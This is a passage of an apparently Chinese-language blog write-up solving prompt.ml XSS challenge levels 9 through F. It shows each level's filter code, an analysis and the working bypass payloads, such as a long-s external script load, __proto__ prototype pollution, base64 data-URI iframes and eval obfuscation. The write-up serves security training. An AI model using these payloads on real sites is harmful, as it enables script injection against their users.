class=\"headerlink\" title=\"Img:\"></a>Img:</h2><p><img src=\"/img/xss/prompt_ml/level9_001.png\" alt=\"9_1\"></p>\n<ol>\n<li><code>&lt;ſcript src=&quot;http://192.168.75.132/pro.js&quot;&gt;&lt;/script&gt;</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level9_002.png\" alt=\"9_2\"></p>\n<h1 id=\"Level-A\"><a href=\"#Level-A\" class=\"headerlink\" title=\"Level A\"></a>Level A</h1><h2 id=\"Code-10\"><a href=\"#Code-10\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// (╯°□°）╯︵ ┻━┻</span></span><br><span class=\"line\">    input = <span class=\"built_in\">encodeURIComponent</span>(input).replace(<span class=\"regexp\">/prompt/g</span>, <span class=\"string\">'alert'</span>);</span><br><span class=\"line\">    <span class=\"comment\">// ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro</span></span><br><span class=\"line\">    input = input.replace(<span class=\"regexp\">/'/g</span>, <span class=\"string\">''</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// (╯°□°）╯︵ /(.□. \\）DONT FLIP ME BRO</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;script&gt;'</span> + input + <span class=\"string\">'&lt;/script&gt; '</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-10\"><a href=\"#分析-10\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight cos\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">encodeURIComponent() 函数可把字符串作为 URI 组件进行编码。该方法不会对 <span class=\"keyword\">ASCII</span> 字母和数字进行编码，也不会对这些 <span class=\"keyword\">ASCII</span> 标点符号进行编码： - _ . ! ~ * ' ( ) 。</span><br><span class=\"line\">而接下来又将‘消除,传如promp't</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Solutions-10\"><a href=\"#Solutions-10\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span> </span><br><span class=\"line\">promp't(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Img-10\"><a href=\"#Img-10\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><ol>\n<li><code>promp&#39;t(1)</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/levelA_001.png\" alt=\"A_1\"></p>\n<h1 id=\"Level-B\"><a href=\"#Level-B\" class=\"headerlink\" title=\"Level B\"></a>Level B</h1><h2 id=\"Code-11\"><a href=\"#Code-11\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight scilab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span><span class=\"params\">(input)</span> &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">// name should not contain special characters</span></span><br><span class=\"line\">    var memberName = input.replace(/[[|\\s+*/\\\\&lt;&gt;&amp;^:;=~!%-]/g, <span class=\"string\">''</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// data to be parsed as JSON</span></span><br><span class=\"line\">    var dataString = <span class=\"string\">'&#123;\"</span>action<span class=\"string\">\":\"</span>login<span class=\"string\">\",\"</span>message<span class=\"string\">\":\"</span>Welcome back, <span class=\"string\">' + memberName + '</span>.<span class=\"string\">\"&#125;'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// directly \"parse\" data in script context</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'                                \\n\\</span></span><br><span class=\"line\"><span class=\"string\">    &lt;script&gt;                                    \\n\\</span></span><br><span class=\"line\"><span class=\"string\">        var data = '</span> + dataString + <span class=\"string\">';          \\n\\</span></span><br><span class=\"line\"><span class=\"string\">        if (data.action === \"</span>login<span class=\"string\">\")            \\n\\</span></span><br><span class=\"line\"><span class=\"string\">            document.write(data.message)        \\n\\</span></span><br><span class=\"line\"><span class=\"string\">    &lt;/script&gt; '</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-11\"><a href=\"#分析-11\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight erlang-repl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">将以下符号消除</span><br><span class=\"line\">[ | 空白符 + * \\ &lt; &gt; &amp; ^ : ; = ~ ! <span class=\"comment\">% -</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Solutions-11\"><a href=\"#Solutions-11\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>. 测试时发现<span class=\"keyword\">json对象的名称相同时会取最右的值,但是这里过滤了：,有什么办法绕过呢。</span></span><br><span class=\"line\"><span class=\"keyword\">官方答案是:\"(prompt(1))in\"</span></span><br><span class=\"line\"><span class=\"keyword\">in是js的关系操作符</span></span><br><span class=\"line\"><span class=\"keyword\">这个会发生js错误，但是能执行prompt(1)</span></span><br><span class=\"line\"><span class=\"keyword\"></span></span><br><span class=\"line\"><span class=\"keyword\">同样答案也可是：\"(prompt(1))instanceof\"</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/prompt_ml/levelB_001.png\" alt=\"B_1\"></p>\n<h2 id=\"Img-11\"><a href=\"#Img-11\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><ol>\n<li><p><code>&quot;(prompt(1))in&quot;</code></p>\n<p><img src=\"/img/xss/prompt_ml/levelB_002.png\" alt=\"B_2\"></p>\n</li>\n<li><p><code>&quot;(prompt(1))instanceof&quot;</code></p>\n<p><img src=\"/img/xss/prompt_ml/levelB_003.png\" alt=\"B_3\"></p>\n</li>\n</ol>\n<h1 id=\"Level-C\"><a href=\"#Level-C\" class=\"headerlink\" title=\"Level C\"></a>Level C</h1><h2 id=\"Code-12\"><a href=\"#Code-12\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// in Soviet Russia...</span></span><br><span class=\"line\">    input = <span class=\"built_in\">encodeURIComponent</span>(input).replace(<span class=\"regexp\">/'/g</span>, <span class=\"string\">''</span>);</span><br><span class=\"line\">    <span class=\"comment\">// table flips you!</span></span><br><span class=\"line\">    input = input.replace(<span class=\"regexp\">/prompt/g</span>, <span class=\"string\">'alert'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// ノ┬─┬ノ ︵ ( \\o°o)\\</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;script&gt;'</span> + input + <span class=\"string\">'&lt;/script&gt; '</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-12\"><a href=\"#分析-12\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight maxima\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">encodeURIComponent() 函数可把字符串作为 URI 组件进行编码。该方法不会对 ASCII 字母和数字进行编码，也不会对这些 ASCII 标点符号进行编码： - <span class=\"symbol\">_</span> . ! ~ * ' ( ) 。</span><br><span class=\"line\"></span><br><span class=\"line\">这里只能利用编码了</span><br><span class=\"line\">参考答案利用parseInt(字符串,基数)函数将字符串转换成整数,用指定基数表示。</span><br><span class=\"line\">parseInt(<span class=\"string\">\"prompt\"</span>,<span class=\"number\">36</span>); //<span class=\"number\">1558153217</span></span><br><span class=\"line\">然后又用toString转化回来,用<span class=\"built_in\">concat</span>函数拼接编码的(<span class=\"number\">1</span>)</span><br><span class=\"line\">参考答案:</span><br><span class=\"line\"><span class=\"built_in\">eval</span>((<span class=\"number\">1558153217</span>).toString(<span class=\"number\">36</span>).<span class=\"built_in\">concat</span>(String.fromCharCode(<span class=\"number\">40</span>)).<span class=\"built_in\">concat</span>(<span class=\"number\">1</span>).<span class=\"built_in\">concat</span>(String.fromCharCode(<span class=\"number\">41</span>)))</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Solutions-12\"><a href=\"#Solutions-12\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>eval((<span class=\"number\">1558153217</span>).toString(<span class=\"number\">36</span>).concat(String.fromCharCode(<span class=\"number\">40</span>)).concat(<span class=\"number\">1</span>).concat(String.fromCharCode(<span class=\"number\">41</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">2.</span> 参考答案的简化版,因为没有对(<span class=\"number\">1</span>)过滤</span><br><span class=\"line\">eval((<span class=\"number\">630038579</span>).toString(<span class=\"number\">30</span>))(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Img-12\"><a href=\"#Img-12\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><ol>\n<li><code>eval((1558153217).toString(36).concat(String.fromCharCode(40)).concat(1).concat(String.fromCharCode(41)))</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/levelC_001.png\" alt=\"C_1\"></p>\n<ol start=\"2\">\n<li><code>eval((630038579).toString(30))(1)</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/levelC_002.png\" alt=\"C_2\"></p>\n<h1 id=\"Level-D\"><a href=\"#Level-D\" class=\"headerlink\" title=\"Level D\"></a>Level D</h1><h2 id=\"Code-13\"><a href=\"#Code-13\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// extend method from Underscore library</span></span><br><span class=\"line\">    <span class=\"comment\">// _.extend(destination, *sources) </span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">extend</span>(<span class=\"params\">obj</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> source, prop;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">1</span>, length = <span class=\"built_in\">arguments</span>.length; i &lt; length; i++) &#123;</span><br><span class=\"line\">            source = <span class=\"built_in\">arguments</span>[i];</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (prop <span class=\"keyword\">in</span> source) &#123;</span><br><span class=\"line\">                obj[prop] = source[prop];</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// a simple picture plugin</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// pass in something like &#123;\"source\":\"http://sandbox.prompt.ml/PROMPT.JPG\"&#125;</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> data = <span class=\"built_in\">JSON</span>.parse(input);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> config = extend(&#123;</span><br><span class=\"line\">            <span class=\"comment\">// default image source</span></span><br><span class=\"line\">            source: <span class=\"string\">'http://placehold.it/350x150'</span></span><br><span class=\"line\">        &#125;, <span class=\"built_in\">JSON</span>.parse(input));</span><br><span class=\"line\">        <span class=\"comment\">// forbit invalid image source</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"regexp\">/[^\\w:\\/.]/</span>.test(config.source)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">delete</span> config.source;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// purify the source by stripping off \"</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> source = config.source.replace(<span class=\"regexp\">/\"/g</span>, <span class=\"string\">''</span>);</span><br><span class=\"line\">        <span class=\"comment\">// insert the content using mustache-ish template</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'&lt;img src=\"&#123;&#123;source&#125;&#125;\"&gt;'</span>.replace(<span class=\"string\">'&#123;&#123;source&#125;&#125;'</span>, source);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'Invalid image data.'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// in Soviet Russia...</span></span><br><span class=\"line\">    input = <span class=\"built_in\">encodeURIComponent</span>(input).replace(<span class=\"regexp\">/'/g</span>, <span class=\"string\">''</span>);</span><br><span class=\"line\">    <span class=\"comment\">// table flips you!</span></span><br><span class=\"line\">    input = input.replace(<span class=\"regexp\">/prompt/g</span>, <span class=\"string\">'alert'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// ノ┬─┬ノ ︵ ( \\o°o)\\</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;script&gt;'</span> + input + <span class=\"string\">'&lt;/script&gt; '</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-13\"><a href=\"#分析-13\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//input参数是这里进入的</span></span><br><span class=\"line\">try &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 举例输入的参数 &#123;\"source\":\"http://sandbox.prompt.ml/PROMPT.JPG\"&#125;</span></span><br><span class=\"line\">        <span class=\"comment\">//将input字符串转换成js数据</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> data = JSON.<span class=\"keyword\">parse</span>(<span class=\"keyword\">input</span>);</span><br><span class=\"line\">        获得定死的source</span><br><span class=\"line\">        <span class=\"keyword\">var</span> config = extend(&#123;</span><br><span class=\"line\">            <span class=\"comment\">// default image source</span></span><br><span class=\"line\">            source: 'http:<span class=\"comment\">//placehold.it/350x150'</span></span><br><span class=\"line\">        &#125;, JSON.<span class=\"keyword\">parse</span>(<span class=\"keyword\">input</span>));</span><br><span class=\"line\">        <span class=\"comment\">// 如果存在 字母数字下划线 / . 以外的就删除sourse </span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (/[^\\w:\\/.]/.<span class=\"keyword\">test</span>(config.source)) &#123;</span><br><span class=\"line\">            delete config.source;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        消除 \"</span><br><span class=\"line\">        <span class=\"keyword\">var</span> source = config.source.<span class=\"keyword\">replace</span>(/\"/<span class=\"keyword\">g</span>, '');</span><br><span class=\"line\">        <span class=\"comment\">// 插入sourse</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> '&lt;img src=<span class=\"string\">\"&#123;&#123;source&#125;&#125;\"</span>&gt;'.<span class=\"keyword\">replace</span>('&#123;&#123;source&#125;&#125;', source);</span><br><span class=\"line\">    &#125; catch (<span class=\"keyword\">e</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> 'Invalid image data.';</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这题的绕过需要<code>Object.prototype.__proto__</code>这个属性，这个属性已经不被建议用在实际代码中。</p>\n<p>看下面的例子是如何利用的。</p>\n<p><img src=\"/img/xss/prompt_ml/levelD_001.png\" alt=\"D_1\"></p>\n<p>当原来的值被删除时,可以用<code>__proto__</code>属性来赋值。可以构造形如</p>\n<p><code>{&quot;source&quot;:&quot;*&quot;,&quot;__proto__&quot;:{&quot;source&quot;:&quot;&quot;onerror=prompt(1)&gt;&quot;}}</code>来使原来的sources失效,而使用自己写入的来突破。</p>\n<p>但是第二次过滤的时候消除了<code>”</code>，想办法找个替代双引号的方法。</p>\n<p>这里的技巧为<code>String.prototype.replace()</code>支持特殊的<code>pattern</code>:</p>\n<p><img src=\"/img/xss/prompt_ml/levelD_002.png\" alt=\"D_2\"></p>\n<p>replace中使用$`会将变量的前部插入。</p>\n<p>在这里就是<code>&lt;img src=&quot;</code>，借用这个虽然playad结构改变,但是绕过了<code>&quot;</code></p>\n<h2 id=\"Solutions-13\"><a href=\"#Solutions-13\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>&#123;<span class=\"attr\">\"source\"</span>:<span class=\"string\">\"*\"</span>,<span class=\"attr\">\"__proto__\"</span>:&#123;<span class=\"attr\">\"source\"</span>:<span class=\"string\">\"$`onerror=prompt(1)&gt;\"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Img-13\"><a href=\"#Img-13\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><p>1.</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;<span class=\"attr\">\"source\"</span>:<span class=\"string\">\"*\"</span>,<span class=\"attr\">\"__proto__\"</span>:&#123;<span class=\"attr\">\"source\"</span>:<span class=\"string\">\"$`onerror=prompt(1)&gt;\"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/prompt_ml/levelD_003.png\" alt=\"D_3\"></p>\n<h1 id=\"Level-E\"><a href=\"#Level-E\" class=\"headerlink\" title=\"Level E\"></a>Level E</h1><h2 id=\"Code-14\"><a href=\"#Code-14\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span><span class=\"params\">(input)</span></span> &#123;</span><br><span class=\"line\">    // I expect this one will have other solutions, so be creative :)</span><br><span class=\"line\">    // mspaint makes all file names <span class=\"keyword\">in</span> all-caps :(</span><br><span class=\"line\">    // too lazy to convert them back <span class=\"keyword\">in</span> <span class=\"built_in\">lower</span> case</span><br><span class=\"line\">    // sample <span class=\"built_in\">input</span>: prompt.jpg =&gt; PROMPT.JPG</span><br><span class=\"line\">    <span class=\"built_in\">input</span> = <span class=\"built_in\">input</span>.toUpperCase();</span><br><span class=\"line\">    // only allows images <span class=\"built_in\">loaded</span> from own host <span class=\"keyword\">or</span> data URI scheme</span><br><span class=\"line\">    <span class=\"built_in\">input</span> = <span class=\"built_in\">input</span>.replace(/\\/\\/|\\w+:/g, <span class=\"string\">'data:'</span>);</span><br><span class=\"line\">    // miscellaneous filtering</span><br><span class=\"line\">    <span class=\"built_in\">input</span> = <span class=\"built_in\">input</span>.replace(/[\\\\&amp;+%\\s]|vbs/gi, <span class=\"string\">'_'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;img src=\"'</span> + <span class=\"built_in\">input</span> + <span class=\"string\">'\"&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-14\"><a href=\"#分析-14\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight haskell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">第一层：转成大写</span><br><span class=\"line\">第二层：把// xxx:转成<span class=\"class\"><span class=\"keyword\">data</span>(<span class=\"title\">xxx</span>表示任意字母)</span></span><br><span class=\"line\">第三层：过滤了\\ &amp; + % 空白符 和vbs</span><br><span class=\"line\">由于转换了大写,html的标签无法使用了,这时候考虑引用外部的js文件。</span><br><span class=\"line\">由于引用外部的js文件势必要使用到http:或http:这样的协议,所有这条路被封死了。</span><br><span class=\"line\">考虑一下<span class=\"class\"><span class=\"keyword\">data</span>:是否能利用。</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/prompt_ml/levelE_001.png\" alt=\"E_1\"></p>\n<p>因为经过大写转换,就只能利用base64编码的写法了。</p>\n<p><code>&lt;IFRAME/SRC=&quot;data:TEXT/HTML;BASE64,PHNJCMLWDD5WCM9TCHQOMSK8L3NJCMLWDD4=&quot;&gt;</code></p>\n<p><code>PHNJCMLWDD5WCM9TCHQOMSK8L3NJCMLWDD4=</code>是<code>&lt;script&gt;prompt(1)&lt;/script&gt;</code>经过base64编码再改大写的。</p>\n<h2 id=\"Solutions-14\"><a href=\"#Solutions-14\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight gcode\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span> <span class=\"string\">\"&gt;&lt;iframe/src=\"</span>data:text/html;base<span class=\"number\">64</span>,PH<span class=\"symbol\">NjcmlwdD5</span>wc<span class=\"name\">m9</span>tcHQoMSk<span class=\"number\">8</span>L<span class=\"number\">3</span><span class=\"symbol\">NjcmlwdD4</span>=</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Img-14\"><a href=\"#Img-14\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><p>这题在环境下没有成功,但是在本地测试下是可行的。</p>\n<p><img src=\"/img/xss/prompt_ml/levelE_002.png\" alt=\"E_2\"></p>\n<h1 id=\"Level-F\"><a href=\"#Level-F\" class=\"headerlink\" title=\"Level F\"></a>Level F</h1><h2 id=\"Code-15\"><a href=\"#Code-15\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight scilab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span><span class=\"params\">(input)</span> &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">// sort of spoiler of level 7</span></span><br><span class=\"line\">    input = input.replace(/\\*/g, <span class=\"string\">''</span>);</span><br><span class=\"line\">    <span class=\"comment\">// pass in something like dog#cat#bird#mouse...</span></span><br><span class=\"line\">    var segments = input.split(<span class=\"string\">'#'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> segments.map(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(title, index)</span> &#123;</span></span><br><span class=\"line\">        <span class=\"comment\">// title can only contain 15 characters</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'&lt;p class=\"</span>comment<span class=\"string\">\" title=\"</span><span class=\"string\">' + title.slice(0, 15) + '</span><span class=\"string\">\" data-comment=\\'&#123;\"</span>id<span class=\"string\">\":'</span> + index + <span class=\"string\">'&#125;\\'&gt;&lt;/p&gt;'</span>;</span><br><span class=\"line\">    &#125;).join(<span class=\"string\">'\\n'</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-15\"><a href=\"#分析-15\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><p>这一课和Level7的很类似。解决的思路是一样的,这里最大长度为15个字符,可以使用&lt;!–多行注释。</p>\n<h2 id=\"Solutions-15\"><a href=\"#Solutions-15\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><ol>\n<li><p><code>&quot;&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1&lt;!--#--&gt;)&lt;/script&gt;</code><br>经过测试firfox下面也可以<br><code>&quot;&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1&lt;!--#--&gt;)&lt;/</code></p>\n</li>\n<li></li>\n</ol>\n<p><code>&quot;&gt;&lt;script&gt;`#${prompt(1)}#`&lt;/script&gt;</code></p>\n<ol start=\"3\">\n<li>利用eval函数特性执行拼接内容</li>\n</ol>\n<p><code>&quot;&gt;&lt;script&gt;/*#*/a=&#39;prom&#39;/*#*/+&#39;pt(1)&#39;/*#*/eval(a)/*#*/&lt;/script&gt;</code></p>\n<h2 id=\"Img-15\"><a href=\"#Img-15\" class=\"headerlink\" 